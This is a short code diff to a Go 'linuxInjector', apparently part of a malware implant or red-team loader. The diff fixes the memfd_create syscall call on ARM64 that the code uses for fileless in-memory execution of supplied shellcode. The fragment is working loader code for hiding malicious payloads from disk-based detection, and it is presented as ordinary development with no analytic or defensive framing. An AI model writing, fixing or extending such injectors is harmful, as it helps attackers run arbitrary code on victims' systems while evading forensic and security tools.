@@ -35,11 +35,11 @@ func (l *linuxInjector) Inject(shellcode []byte) error {
 
 // injectMemFD uses memfd_create for fileless execution.
 func (l *linuxInjector) injectMemFD(shellcode []byte) error {
-	name := ""
+	nameBytes, _ := syscall.BytePtrFromString("")
 	flags := 0
 
 	// memfd_create syscall number on ARM64 is 279
-	fd, _, errno := syscall.Syscall(279, uintptr(unsafe.Pointer(&name)), uintptr(flags), 0)
+	fd, _, errno := syscall.Syscall(279, uintptr(unsafe.Pointer(nameBytes)), uintptr(flags), 0)
 	if errno != 0 {
 		return fmt.Errorf("memfd_create failed: %v (kernel >= 3.17 required)", errno)
 	}
